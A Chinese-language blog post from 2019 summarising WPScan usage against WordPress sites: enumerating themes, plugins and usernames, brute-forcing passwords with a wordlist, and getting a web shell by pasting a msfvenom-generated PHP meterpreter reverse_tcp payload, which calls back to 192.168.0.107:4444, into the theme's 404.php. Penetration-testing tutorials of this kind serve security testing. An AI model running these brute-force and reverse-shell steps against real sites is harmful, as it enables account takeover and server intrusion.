---
layout:     post
title:      WPscan使用总结
subtitle:   WPscan使用总结
date:       2019-09-05
author:     木已成舟
header-img: img/post-bg-rwd.jpg
catalog: 	 true
tags:
    - 工具使用
---
## 前言
最近在给某省教育厅的资产进行扫描时，发现一些网站建站程序用的是WordPress，于是就有了本文，本文主要记录了WPscan的一些用法；
## 更新wpscan
在使用WPscan前，它需要你更新到最新版本：
```
ruby wpscan.rb --update
```
![图片](../../../../img/wpscan_1.png)
## 扫描WorePress版本
扫描Wordpress搭建的网站：
```
wpscan -u http://127.0.0.1/
```
## 枚举WordPress主题
通过以下命令枚举网站安装的WordPress主题：
```
wpscan -u http://127.0.0.1/ --enumerate t
```
## 枚举WordPress易受攻击的主题
通过以下命令枚举网站安装的易受攻击的WordPress主题：
```
wpscan -u http://127.0.0.1/ --enumerate vt
```
## 枚举WordPress插件
通过以下命令枚举网站安装的WordPress插件：
```
wpscan -u http://127.0.0.1/ --enumerate p
```
## 枚举WordPress易受攻击的插件
通过以下命令枚举网站安装的易受攻击的WordPress插件：
```
wpscan -u http://127.0.0.1/ --enumerate vp
```
## 枚举WordPress用户名
通过以下命令枚举网站的用户名：
```
wpscan -u http://127.0.0.1/ --enumerate u
```
下图可以看到成功获取到了7个用户名：
## ![图片](../../../../img/wpscan_2.png)

## 使用Wpscan进行暴力攻击
通过上面的枚举用户名步骤，我们已知了用户名，因此只差爆破密码，输入以下命令开始爆破密码：
```
wpscan -u http://127.0.0.1/ --wordlist /root/Desktop/dict.txt --username test
```

## 一行命令枚举插件、主题、用户
上面的命令还是比较繁琐的，我们可以通过以下一行命令，“一键”枚举插件、主题、用户：
```
wpscan -u http://127.0.0.1/ -e at -e ap -e u
```
at：枚举目标网站的所有主题
ap：枚举目标网站的所有插件
u：枚举目标网站的所有用户名
## WordPress 后台Getshell
当我们通过一些弱口令/漏洞利用，进入后台后，通过后台拿WebShell的方法，这里推荐进入外观--编辑([http://127.0.0.1](http://127.0.0.1)[/wp-admin/theme-editor.php)](http://www.test.me/wp-admin/theme-editor.php))--修改404.php的代码(使用msfvenom生成php反弹shell)
```
msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.107 lport=4444 -f raw
```
![图片](../../../../img/wpscan_3.png)

## 使用Metasploit利用易受攻击的插件
当我们通过WPscan扫到红色感叹号的提示信息时，我们可以搜索msf中是否存在这个利用脚本，来达到获取Shell的目的，下图是真实环境中某站存在的一个漏洞：
![图片](../../../../img/wpscan_4.png)

![图片](../../../../img/wpscan_5.png)

